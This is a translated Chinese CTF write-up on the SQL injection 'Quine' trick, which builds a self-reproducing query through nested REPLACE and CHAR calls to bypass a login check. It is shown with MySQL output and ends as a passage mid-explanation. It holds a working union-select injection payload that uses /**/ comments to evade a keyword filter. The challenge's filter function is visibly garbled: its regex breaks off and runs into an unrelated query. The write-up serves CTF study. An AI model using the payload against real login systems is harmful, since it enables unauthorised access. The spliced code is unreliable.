# 从三道赛题再谈Quine trick
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
`Quine`本身不是一个非常新的考点了（最早可以追溯到2014年的`Codegate CTF
Finals`），但是他在实际利用中还存在很多细小的点，导致我们可能无法达到最后的效果，所以谨以此篇用三道比较典型的赛题重新梳理一下。
## 0x01 简介
`Quine`又叫做自产生程序，在`sql`注入技术中，这是一种使得输入的`sql`语句和输出的`sql`语句一致的技术，常用于一些特殊的登陆绕过`sql`注入中。
## 0x02 举例:yet_another_mysql_injection
第三届第五空间网络安全大赛的`yet_another_mysql_injection`赛题：
    function checkSql($s) {
        if(preg_match("/regexp|between|in|flag|=|>| SELECT REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")');
    +---------------------------------------------------------------------------+
    | REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")') |
    +---------------------------------------------------------------------------+
    | REPLACE("REPLACE(".",CHAR(46),".")",CHAR(46),"REPLACE(".",CHAR(46),".")") |
    +---------------------------------------------------------------------------+
    1 row in set (0.0005 sec)
###  0x022 从解决单双引号理解Quine
细心点的话就会发现，这里还存在单双引号的问题，我们重新考虑存在单双引号的情况。
`Quine`的基本形式：
    REPLACE('str',编码的间隔符,'str')
`str`描述为如下形式：
    REPLACE("间隔符",编码的间隔符,"间隔符")
这里`str`中的间隔符使用双引号的原因是，`str`已经被单引号包裹，为避免引入新的转义符号，间隔符需要使用双引号。
运算后的结果是：
    REPLACE("str",编码的间隔符,"str")
但是我们希望`str`仍然使用单引号包裹，怎么办？
我们这样考虑，如果先使用`REPLACE`将`str`的双引号换成单引号，这样最后就不会出现引号不一致的情况了。
`Quine`的升级版基本形式：
    REPLACE(REPLACE('str',CHAR(34),CHAR(39)),编码的间隔符,'str')
`str`的升级版形式：
    REPLACE(REPLACE("间隔符",CHAR(34),CHAR(39)),编码的间隔符,"间隔符")
这里的`CHAR(34)`是双引号，`CHAR(39)`是单引号，如果`CHAR`被禁了`0x22`和`0x27`是一样的效果。
这里我们慢一点。
第一步：
    REPLACE(REPLACE("间隔符",CHAR(34),CHAR(39)),编码的间隔符,"间隔符")
    变成了
    REPLACE(REPLACE('间隔符',CHAR(34),CHAR(39)),编码的间隔符,'间隔符')
第二步：
    REPLACE('单引号str',编码的间隔符,'str')
    变成了
    REPLACE(REPLACE('str',CHAR(34),CHAR(39)),编码的间隔符,'str')
我们同样举刚才的例子，设间隔符为`'.'`，编码的间隔符为`CHAR(46)`，那么`str`为：
    REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")
放入最后的语句为：
    REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")')
执行的结果为（先执行的内层`REPLACE`）：
    REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")')
实际结果：
     MySQL  localhost:3306 ssl  SQL > SELECT REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")');
    +------------------------------------------------------------------------------------------------------------------------------------------------------------+
    | REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")') |
    +------------------------------------------------------------------------------------------------------------------------------------------------------------+
    | REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")') |
    +------------------------------------------------------------------------------------------------------------------------------------------------------------+
    1 row in set (0.0004 sec)
现在就完全一致了。
###  0x023 从实际解题中理解Quine
我们现在重看这道题的payload：
    '/**/union/**/SELECT/**/REPLACE(REPLACE('"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39)),CHAR(46),'"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#')/**/AS/**/ch3ns1r#
可能刚开始不太理解为什么内层`REPLACE`会存在不匹配的一个双引号，那么现在就容易理解了。
`str`为：